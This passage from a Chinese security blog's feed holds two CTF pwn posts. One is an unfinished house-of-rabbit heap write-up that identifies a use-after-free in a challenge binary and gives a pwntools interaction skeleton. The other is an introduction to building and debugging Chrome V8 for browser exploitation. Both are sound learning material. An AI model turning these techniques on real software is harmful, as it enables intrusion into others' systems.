alt="image-20250307092126413"></p><ul><li>这个实验的利用方式是通过<code>UAF</code>漏洞来进行利用的，而在<code>CTF_wiki</code>对<code>house-of-rabbit</code>其实有两种利用方式，第一种其实就是利用<code>UAF</code>漏洞去修改<code>fd</code>指针。</li><li>而第二种可以通过<code>UAF</code>或者堆溢出的漏洞去修改<code>size</code>位，从而构造出堆叠。</li></ul><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><ul><li>接下来我们来详细讲解一下利用方式。主要还是参考<code>ctf_wiki</code>上的利用方式，而实验中的利用方式确实不是很明显。</li></ul><h1 id="house_of_rabbit_level_1"><a class="markdownIt-Anchor" href="#house_of_rabbit_level_1"></a> house_of_rabbit_level_1</h1><ul><li>接下来我们就来写一题。</li><li>这题的题目来源：pwn_hitbctf2018_mutepig</li></ul><h2 id="level1_分析1"><a class="markdownIt-Anchor" href="#level1_分析1"></a> level1_分析1</h2><ul><li>拿到附件我们就先来<code>check</code>一下这些保护机制。发现开启了如下的保护机制。</li><li><code>got</code>表可以修改，然后<code>PIE</code>没有开启。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321221015123.png" alt="image-20250321221015123"></p><ul><li>接下来我们先来静态分析一下这个程序的具体运行逻辑。先来查看<code>main</code>函数，<code>main</code>函数的运行逻辑如下（我们先根据程序的大致逻辑，修改了函数名称）：<ul><li>首先<code>main</code>函数会先进行输入输出初始化即调用<code>init_()</code>函数</li><li>调用完<code>init_()</code>函数后就会调用<code>gift()</code>这个函数。（之后具体查看一下，就明白为什么我会重命名为gift函数）</li><li>之后就是进入一个菜单的循环，循环实现的是<code>增</code>、<code>删</code>、<code>改</code>这三个功能</li></ul></li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321221502831.png" alt="image-20250321221502831"></p><ul><li>我们现在来查看一下<code>gift</code>这个函数，这个函数会执行<code>system(&quot;cat banner.txt&quot;)</code>，这就相当于我们有<code>system</code>这个函数了，我们就节省了泄露libc地址这一步。</li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321221743356.png" alt="image-20250321221743356"></p><ul><li>之后我们来查看一下<code>add()</code>这个函数，这个函数的执行逻辑大概可以分成两个部分<ul><li>第一个部分就是让用户输入选项，输入<code>1</code>、<code>2</code>、<code>3</code>三个选项的其中一个就会申请相应大小的堆块，这里如果输入<code>13337</code>就会申请一个非常大的堆块（只能申请一次）。</li><li>当申请失败的时候程序就会直接返回</li><li>之后用户可以向刚申请的堆块写入<code>0x7</code>字节的数据，第<code>0x8</code>个字节会变成空字节。</li><li>之后再对<code>ptr</code>这个指针数组进行遍历操作，将我们刚申请的堆块放入<code>ptr</code>这个指针数组空闲的位置中，在放入之前还会检查数组是否越界。</li></ul></li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321222116773.png" alt="image-20250321222116773"></p><ul><li>然后我们再查看<code>edit</code>这个选项<ul><li>可以向用户指定的堆块重新写入<code>0x8</code>字节，实际写入<code>0x7</code>字节，最后一个字节会置<code>0</code></li><li>然后还会像全局变量<code>str</code>读入<code>48</code>个字节，即读入<code>0x30</code>字节。</li></ul></li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321222817448.png" alt="image-20250321222817448"></p><ul><li>之后我们查看<code>delete</code>这个函数，这个函数实现的功能就为释放用户指定的堆块。<strong>注意：这里存在UAF漏洞，也就是说我们可以修改堆块的<code>fd</code>指针</strong></li></ul><p><img src="/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/image-20250321223035155.png" alt="image-20250321223035155"></p><h2 id="level_1分析2"><a class="markdownIt-Anchor" href="#level_1分析2"></a> level_1分析2</h2><ul><li>接下来我们就先写好<code>exp</code>中与程序的交互部分。这时我们发现这个程序没有文字说明，就是纯交互。</li><li><code>exp</code>中交互的部分如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./mutepig_fix&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choose</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(choose).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">context1,context2</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.send(context1)</span><br><span class="line">        p.send(context2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>接下来我们就来动态调试，一边动态调试，一边寻找打法。</li></ul><h2 id="level_1_exp"><a class="markdownIt-Anchor" href="#level_1_exp"></a> level_1_exp</h2><h1 id="house_of_rabbit_level_2"><a class="markdownIt-Anchor" href="#house_of_rabbit_level_2"></a> house_of_rabbit_level_2</h1><h1 id="house_of_rabbit_level_3"><a class="markdownIt-Anchor" href="#house_of_rabbit_level_3"></a> house_of_rabbit_level_3</h1><h1 id="house_of_rabbit_level_4"><a class="markdownIt-Anchor" href="#house_of_rabbit_level_4"></a> house_of_rabbit_level_4</h1><h1 id="house_of_rabbit_level_5"><a class="markdownIt-Anchor" href="#house_of_rabbit_level_5"></a> house_of_rabbit_level_5</h1>]]></content>
    
    
    <summary type="html">前言：好像找回节奏了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>Chrome-v8-入门</title>
    <link href="http://iyheart.github.io/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/"/>
    <id>http://iyheart.github.io/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/</id>
    <published>2025-02-25T12:15:28.000Z</published>
    <updated>2025-02-27T06:32:55.542Z</updated>
    
    <content type="html"><![CDATA[<ul><li>学习一下<code>Chrome-v8</code>，堆打累了，顺便给新生赛出一题简单的<code>chrome-v8</code>的<code>pwn</code>题</li><li>参考博客：<a href="https://a1ex.online/2021/09/17/Chorme-v8-%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">Chorme-v8-入门学习 | A1ex’s Blog</a></li><li>参考博客：<a href="https://hornos3.github.io/2024/12/01/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-1/">chrome v8 pwn 学习 (1) | CoLin’s BLOG</a></li><li>参考博客：<a href="https://zmx2321.github.io/vite-blog/pages/note/front/v8-note/v8-note-9.html#%E4%BD%BF%E7%94%A8-d8-%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95">如何构建和使用V8的调试工具d8 | zmx的前端日志</a></li><li>参考博客：<a href="https://www.freebuf.com/vuls/203721.html">从一道CTF题零基础学V8漏洞利用 - FreeBuf网络安全行业门户</a></li><li>参考博客：<a href="https://sky123.blog.csdn.net/article/details/130124693?spm=1001.2014.3001.5502">Chrome v8 pwn-CSDN博客</a></li><li>参考博客：<a href="https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">CVE-2021-21220 Chrome v8远程代码执行漏洞复现与分析 | 唐仔橙</a></li></ul><h1 id="浏览器相关知识"><a class="markdownIt-Anchor" href="#浏览器相关知识"></a> 浏览器相关知识</h1><ul><li><code>Chrome-v8</code>的<code>pwn</code>属于浏览器的<code>pwn</code>。接下来对浏览器做一个比较系统比较全面的了解</li><li><code>Chrome</code>就是我们经常说的<strong>谷歌浏览器</strong>，本质上是一个网页浏览器，该浏览器是由谷歌公司开发的。而<code>Chrome</code>里面的<code>JavaScript</code><strong>解释器</strong>被称为<code>v8</code>，一开始主要做的pwn题就是面向<code>v8</code>。</li><li>接下来介绍一下主流的<code>JS</code>引擎。</li></ul><table><thead><tr><th>引擎</th><th>开发者</th><th>主要应用</th><th>编译方式</th><th>备注</th></tr></thead><tbody><tr><td>V8</td><td>Google</td><td>Chrome、Node.js</td><td>JIT（TurboFan + lgnition）</td><td>速度快，广泛用于服务器端</td></tr><tr><td>SpiderMonkey</td><td>Mozilla</td><td>Firefox</td><td>JIT（IonMonkey）</td><td>早期JS引擎，支持WebAssembly</td></tr><tr><td>JavaScriptCore（JSC）</td><td>Apple</td><td>Safari、WebKit</td><td>JIT（Nitro）</td><td>适用于macOS/iOS</td></tr><tr><td>Chakra</td><td>Microsoft</td><td>旧版Edge、IE</td><td>JIT</td><td>Edge现已经改用V8</td></tr><tr><td>Hermes</td><td>Meta</td><td>React Native</td><td>AOT</td><td>专注移动端优化</td></tr><tr><td>QuickJS</td><td>Fabrice Bellard</td><td>嵌入式设备</td><td>解释执行（无 JIT）</td><td>轻量级，支持ES2020</td></tr></tbody></table><ul><li>而解释器这个的实现也就是使用<strong>底层语言</strong>去解释执行另一种语言，在这里是使用<code>C++</code>语言来解释<code>JavaScript</code>语言</li></ul><h1 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h1><h2 id="编译最新版本"><a class="markdownIt-Anchor" href="#编译最新版本"></a> 编译最新版本</h2><ul><li><p>（注：如果是在打比赛现学就请看编译之前版本）</p></li><li><p>这边需要手动编译源码，<code>chrome</code>里面的<code>JavaScript</code>解释器被称为v8</p></li><li><p>我们先要下载一个源码，这个源码被称为<code>v8</code>，而<code>v8</code>经过编译后的文件被称为<code>d8</code>。根据编译的可选项，可以编译出<code>debug</code>版本或者<code>release</code>版本，一般两个版本都编译出来</p></li><li><p>还需要下载两个编译<code>v8</code>源码的工具<code>depot_tools</code>、<code>ninja</code></p><ul><li><code>depot_tools</code>：是用来得到<code>v8</code>源码（也就是使用这个工具去下载<code>v8</code>源码，而不是直接使用<code>git</code>去拉取源码）</li><li><code>ninja</code>：用来编译<code>v8</code></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br></pre></td></tr></table></figure><ul><li>然后将这两个工具添加进环境变量，将<code>depot_tools</code>添加环境变量（注意添加环境变量的时候需要使用绝对路径）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/home/myheart/CTF/pwn/chrome_v8_pwn/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><ul><li>将<code>ninja</code>添加环境变量：在添加ninja为环境变量之前先要使用<code>./configure.py</code>编译<code>ninja</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ninja</span><br><span class="line">./configure.py --bootstrap</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/home/myheart/CTF/pwn/chrome_v8_pwn/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><ul><li>接下来就是使用<code>depot_tools</code>去下载源码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br></pre></td></tr></table></figure><ul><li>然后准备依赖和编译<code>v8</code><ul><li><code>gclient sync</code>:<code>v8</code>项目的所有依赖项（注意旧版的源码可能会出现Python版本问题）</li><li><code>tools/dev/v8gen.py x64.debug</code>：传递给<code>v8gen.py</code>一个参数，表示生成<code>x64</code>架构生成的<code>调试版本</code></li><li><code>ninja -C out.gn/x64.debug   </code>：编译项目</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug    </span><br></pre></td></tr></table></figure><p><strong>注意</strong>：在<code>gclient sync</code>命令执行的时候可能会出现代理问题，执行成功后会在这个文件中生成文件。</p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250214200010144.png" alt="image-20250214200010144"></p><p><strong>注意</strong>：在<code>ninja -C out.gn/x64.debug </code>这个命令就是开始编译了，编译时间比较久，很吃CPU</p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250214202103840.png" alt="image-20250214202103840"></p><h2 id="回退版本与加载补丁"><a class="markdownIt-Anchor" href="#回退版本与加载补丁"></a> 回退版本与加载补丁</h2><ul><li>在打比赛的时候，需要对相应的版本进行调试，这就导致了我们需要编译指定的版本。在比赛中我们得到的<code>v8</code>不一定是最新版本，我们之前编译的版本是<code>V8 version 13.5.0 </code>，假如我们比赛的时候<code>v8</code>的版本为<code>v8 version 13.3</code>版本，这时我们就要回退版本。</li><li>我们现在已经使用<code>fetch v8</code>，将远程的<code>v8</code>源码版本为<code>v8 version 13.5.0</code>给拉取到本地了。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218145114643.png" alt="image-20250218145114643"></p><ul><li>如果我们修改了这个源码，我们就可以使用<code>git diff &gt; my_changes.diff</code>，就会生成一个<code>my_changes.diff</code>文件，这个文件之后有用。</li><li>如果我们想要回退到指定的<code>v8</code>版本，这时就需要输入如下命令，用于查看<code>v8</code>的版本：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218145510100.png" alt="image-20250218145510100"></p><ul><li>要切换版本就需要输入如下命令：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git reset --hard  a7a350012c05f644f3f373fb48d7ac72f7f60542 (这后面的是<span class="built_in">hash</span>值)</span><br><span class="line">//6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">// 之后还需要执行如下命令</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure><h1 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h1><ul><li><p><code>js</code>有两种动态调试的方式</p><ul><li>第一种使用的是<code>d8</code>内部的<code>API</code>调试，但是调试并没有调试到<code>寄存器</code>、<code>内存</code>这么底层。</li><li>第二种就是使用<code>d8</code>配合<code>gdb</code>进行调试，这种调试就会涉及到<code>寄存器</code>和<code>内存</code></li></ul></li><li><p>对于第一种方式，具体介绍一下<code>V8</code>内部的比较重要的<code>API</code>：</p></li></ul><table><thead><tr><th>API</th><th>作用</th></tr></thead><tbody><tr><td>%SystemBreak();</td><td>触发断点（gdb调试的时候在相应上层js代码中触发断点，底层太多代码不好找断点）</td></tr><tr><td>%DebugPrint(dv);</td><td>输出对象<code>dv</code>的地址，目前最新版他会将<code>dv</code>对象的隐藏类型都会输出出来</td></tr><tr><td>console.log(%HasInlinedFunctionCode(bar));</td><td>查看 <code>bar</code> 是否被内联</td></tr><tr><td>%CollectGarbage();</td><td>触发垃圾回收</td></tr><tr><td>console.log(%GetHiddenClass(obj));</td><td>获取对象的隐藏类信息</td></tr></tbody></table><h2 id="d8调试"><a class="markdownIt-Anchor" href="#d8调试"></a> d8调试</h2><ul><li>我们先创建一个<code>test.js</code>文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params">property_num,element_num</span>) &#123;</span><br><span class="line">  <span class="comment">//添加可索引属性</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; element_num; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>[i] = <span class="string">`element<span class="subst">$&#123;i&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//添加常规属性</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; property_num; i++) &#123;</span><br><span class="line">      <span class="keyword">let</span> ppt = <span class="string">`property<span class="subst">$&#123;i&#125;</span>`</span></span><br><span class="line">      <span class="variable language_">this</span>[ppt] = ppt</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> bar = <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(%<span class="title class_">HasFastProperties</span>(bar));</span><br><span class="line"><span class="keyword">delete</span> bar.<span class="property">property2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(%<span class="title class_">HasFastProperties</span>(bar));</span><br></pre></td></tr></table></figure><ul><li>然后使用<code>d8 test.js --allow-natives-syntax</code>即可进行调试，使用<code>--allow-natives-syntax</code>就可以调用<code>V8</code>的<code>API</code>，这样就可以输出一些调试信息，这样就可以输出调试信息。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215004347798.png" alt="image-20250215004347798"></p><ul><li>还可以这样进行调试，类似于交互式<code>Shell</code>效果调试。先输入命令<code>../v8/out.gn/x64.debug/d8  --allow-natives-syntax </code></li><li>这样我们就可以进入<code>d8</code>的交互式界面</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215004504171.png" alt="image-20250215004504171"></p><ul><li>然后我们就可以进行一边编写代码一边调试</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215004650130.png" alt="image-20250215004650130"></p><h2 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> gdb调试</h2><ul><li>我们先创建一个<code>test.js</code>文件</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> username = <span class="string">&quot;iwen&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">var</span> people_zhangsan = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);</span><br></pre></td></tr></table></figure><ul><li>使用<code>gdb</code>调试，就要进行如下操作</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ../v8/out.gn/x64.debug/d8</span><br></pre></td></tr></table></figure><ul><li>然后在<code>gdb</code>的内部输入命令，就可以调试了</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> args --allow-natives-syntax test2.js</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215005354891.png" alt="image-20250215005354891"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250215005454750.png" alt="image-20250215005454750"></p><ul><li>在<code>v8</code>源码中就可以<code>v8</code>自带的调试<code>JS</code>代码的gdb插件，我们先进入<code>/path/to/v8/tools目录</code>，然后在这个目录下可以找到<code>gdbinit</code>文件，这样就可以使用如下命令：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> gdbinit ~/.gdbinit_v8</span><br></pre></td></tr></table></figure><ul><li>之后编辑<code>~/.gdbinit</code>，添加如下文件：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.gdbinit_v8</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218143830509.png" alt="image-20250218143830509"></p><ul><li>这样我们调试的时候就会出现对应的源码</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218144212624.png" alt="image-20250218144212624"></p><ul><li>这里也介绍一下<code>~/.gdbinit_v8</code>中的一些调试命令<ul><li><code>job</code>命令：用于可视化显示<code>JavaScript</code>对象的内存结构。</li><li><code>telescope</code>命令：查看内存数据</li></ul></li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218151701532.png" alt="image-20250218151701532"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250218151743753.png" alt="image-20250218151743753"></p><p><strong>注意</strong>：由于<code>JS</code>的对象和元素在内存中都是以二进制的形式存在，为了区分对象和元素，我们会将我们会将<code>指向对象地址的值+1</code>，使用这种方法来区别对象和元素。</p><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="jit编译初步了解"><a class="markdownIt-Anchor" href="#jit编译初步了解"></a> JIT编译初步了解</h2><ul><li><p>这里先介绍一下一些基础知识。<code>Chrome V8</code>目前演变成如下解释过程：</p></li><li><p>当我们编写一个<code>JS</code>代码，使用<code>V8</code>去执行这个<code>JS</code>代码：</p><ul><li>首先我们会通过<code>解析器</code>将<code>V8</code>的<code>JS</code>代码解析为抽象语法树。</li><li>然后会通过<code>解释器</code>对抽象语法树进行解释，将<code>JS</code>代码转换为字节码，一边解释一边执行，并且解释器会记录特定代码片段的运行次数</li><li>当运行次数超过某个阈值，该段代码就会被记为热代码，并且将运行时的信息反馈给<code>优化编译器</code></li><li><code>优化编译器</code>根据反馈信息，优化并编译字节码，生成优化后的机器码，这样再次执行这个代码的时候就会执行相应的机器码。</li></ul></li><li><p>上面的技术就被称为<code>JIT</code>（及时编译技术）</p><ul><li>其中<code>解析器</code>的源码在<code>v8/src/parsing</code></li><li>解释器的源码在<code>v8/src/interpreter</code></li><li>优化编译器源码在<code>v8/src/compiler</code>或者<code>v8/src/maglev</code></li></ul></li></ul><h2 id="js对象通用数据结构"><a class="markdownIt-Anchor" href="#js对象通用数据结构"></a> JS对象通用数据结构</h2><ul><li>这边先贴一张图，说明一下<code>JS</code>类的通用数据结构。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226120215221.png" alt="image-20250226120215221"></p><ul><li>接下来我们使用<code>gdb</code>动态调试，配合<code>job</code>命令和<code>d8 </code>中<code>debug</code>模式下查看对象的这些数据结构。我们使用如下<code>js</code>代码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><ul><li>进行<code>gdb</code>调试，这里我们利用<code>%DebugPrint(a)</code>将<code>a</code>类中的所有数据结构都打印出来了，结果如下，这时我们只要关注红框部分（也就是<code>a</code>对象存储的地址），我们再使用<code>job +a对象的地址</code>，一步一步查看。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226121328743.png" alt="image-20250226121328743"></p><ul><li>我们现在使用<code>job  0xbe400288671</code>这命令，查看的是这个数据结构，由于在<code>64位系统</code>中，数据都会与<code>8</code>字节或者<code>0x10</code>字节内存对齐，所以对于地址来说哪些是<code>+1</code>后的地址就很明显<ul><li><code>map</code>指向的是一个对象，其地址有<code>+1</code>，<code>map</code>所指向的对象就是我们常说的<code>js</code>隐藏类</li><li><code>prototype</code>指向的也是一个对象，</li><li><code>element</code>指向的也是一个对象，而这个就是存储我们通过索引保存的元素。</li><li><code>length</code>相当于这个对象的一个属性，表示这个数组目前的长度</li><li><code>properties</code>：这个也是一个对象，这个对象就表示的</li></ul></li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226121414255.png" alt="image-20250226121414255"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226121433824.png" alt="image-20250226121433824"></p><ul><li>接下来我们来查看<code>map</code>这个隐藏类</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226122103451.png" alt="image-20250226122103451"></p><p><img 